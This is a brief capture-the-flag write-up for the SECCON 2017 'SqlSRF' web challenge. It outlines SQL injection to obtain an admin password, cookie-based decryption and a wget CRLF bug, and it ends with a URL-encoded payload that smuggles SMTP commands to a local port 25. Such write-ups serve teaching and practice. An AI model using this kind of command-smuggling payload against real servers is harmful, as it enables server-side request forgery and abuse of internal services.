## SqlSRF Web 400

Desc 

```
The root reply the flag to your mail address if you send a mail that subject is "give me flag" to root.
http://sqlsrf.pwn.seccon.jp/sqlsrf/
```

At first, we can get source file from [index.cgi_backup20171129](http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi_backup20171129).

And Here is a clear SQL injection, so we can use this injection get admin's password by this [code](https://github.com/LyleMi/CTF/blob/master/2017/seccon/sqlsrf/index.py).

But we need decrypt it, notice index.cgi will decrypt remember.

```pl
$user = &decrypt($q->cookie('remember')) if($user eq '' && $q->cookie('remember') ne '');
```

Then we can know password is ``Yes!Kusomon!!``.

At last, here is a wget ssrf [bug](https://lists.gnu.org/archive/html/bug-wget/2017-03/msg00018.html) which found by orange.

Finally, we can construct a payload like below: 
```
127.0.0.1%0d%0aHELO 127.0.0.1%0aMAIL FROM%3a%3cyoumail%40gmail.com%3e%0aRCPT TO%3a%3croot%3e%0aDATA%0aFrom%3a youmail%40gmail.com%0aTo%3a root%0aSubject%3a give me flag%0d%0a.%0d%0a%0aQUIT%0a:25
```

